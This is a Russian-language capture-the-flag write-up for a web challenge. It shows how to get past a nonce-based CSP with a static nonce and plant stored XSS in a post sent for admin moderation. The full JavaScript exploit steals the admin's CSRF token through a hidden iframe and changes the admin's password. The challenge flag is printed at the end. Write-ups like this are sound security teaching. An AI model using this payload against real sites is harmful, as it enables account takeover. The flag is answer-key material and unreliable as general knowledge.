# Hello, Hacr!

## Описание:


| Название | Сложность |Автор |
|------|-----|-------|
| Hello, Hacr! | Hard | [@collapsz](https://t.me/collapsz17) |

## TLDR

Кража CSRF-токена для **CSRF** через **nonce CSP bypass**

---
## Решение:

Переходим на веб-интерфейс приложения

<img width="1790" alt="изображение" src="https://github.com/user-attachments/assets/5976c61a-e477-415b-9b92-4a3279bea491" />

Можем регистрироваться и авторизовываться, создадим себе аккаунт и посмотрим, что это нам дает

<img width="1790" alt="изображение" src="https://github.com/user-attachments/assets/a898ce0f-8fbb-4d84-bb19-7c03f8ac7e7a" />

Попав за авторизацию, видим, что можем писать посты и отправлять на модерацию

<img width="1793" alt="изображение" src="https://github.com/user-attachments/assets/a3764546-b51b-4314-b69b-cce472684148" />

А наличие `/admin` явно дает понять нам туда. Перейдем к разведке окружения 

<img width="1343" alt="изображение" src="https://github.com/user-attachments/assets/83812a76-3091-456b-acb3-20c1b7b51c1f" />

Так же в приложении предусмотрен функционал смены пароля. Примечательно, что текущий пароль не требуется – нужно лишь быть авторизованным

<img width="1789" alt="изображение" src="https://github.com/user-attachments/assets/18bc5b8d-3686-414c-914c-2916b44df68d" />

Проверим `cookie` – установлен флаг `httponly`, значит просто украсть сессию админа не выйдет

<img width="503" alt="изображение" src="https://github.com/user-attachments/assets/dca3f22f-cf4e-49fa-abcb-f91464df908e" />

Любой запрос сопровождается CSRF-токеном – это усложняет задачку реализации CSRF

<img width="1130" alt="изображение" src="https://github.com/user-attachments/assets/c8b46351-26e2-44be-8755-74f6579fd2ef" />

В заголовках видим весьма суровую CSP:

<img width="548" alt="изображение" src="https://github.com/user-attachments/assets/3228a76a-6a8f-4b8b-83cb-a229c79c9aae" />

Таким образом вектор атаки – обойти CSP, найти способ украсть CSRF-токен администратора, который апрувит посты направо и налево, реализовать CSRF и, сменив пароль жертве, попасть на /admin 

Приступим к способу обойти CSP. CSP Evaluator ...

<img width="968" alt="изображение" src="https://github.com/user-attachments/assets/bb84e315-480d-434b-a704-6c99a480b35b" />

В контексте CSP (Content Security Policy) термин nonce (от "number used once") — это криптографический токен, который используется для разрешения выполнения встроенных скриптов (<script>) или стилей (<style>), если они содержат правильный атрибут nonce. Это механизм защиты от XSS-атак (межсайтового скриптинга), позволяющий контролировать, какие скрипты могут выполняться на странице.

Можем попробовать вызвать алерт с использованием nonce:

```
<script nonce="matrixrain">alert(1)</script>
```

Отлично – CSP обошли. Далее CSRF. Как мы помним, приложение использует CSRF токены для всех действий, значит сменить пароль, не зная этот токен, не выйдет. Однако у нас есть способ вызвать XSS, а значит мы можем внедрить вредоносный код, который сделает все за нас. 

Первым делом создадим `iframe` и укажем его источник, чтобы сделать возможной кражу CSRF-токена:
```
var iframe = document.createElement("iframe");
iframe.src = "/change_password";
iframe.style.display = "none";
document.body.appendChild(iframe);
```
Далее объявим основную функцию эксплоита и извлечем CSRF-токен со страницы /change_password: 
```
iframe.onload = function() {
var csrfToken = iframe.contentDocument.querySelector('input[name="csrf_token"]').value;
```
Укажем наш пароль: 
```
var newPassword = "zxczxczxc";
```
И, наконец, отправим запрос с использованием `XMLHttpRequest`:
```
var xhr = new XMLHttpRequest();
xhr.open("POST", "/change_password", true);
xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
xhr.send("csrf_token=" + csrfToken + "&new_password=" + newPassword);
```
Соберем сплоит воедино:
```
<script nonce="matrixrain">
var iframe = document.createElement("iframe");
iframe.src = "/change_password";
iframe.style.display = "none";
document.body.appendChild(iframe);

iframe.onload = function() {
    var csrfToken = iframe.contentDocument.querySelector('input[name="csrf_token"]').value;
    var newPassword = "zxczxczxc";

    var xhr = new XMLHttpRequest();
    xhr.open("POST", "/change_password", true);
    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    xhr.send("csrf_token=" + csrfToken + "&new_password=" + newPassword);
};
</script>
```
Напишем пост и отправим его на модерацию. 

Остается лишь дождаться модерации от администратора, зайти под ним и забрать флаг!


## Flag:
rdg{af4cf13151aee7af4aa26b9bb817a079}
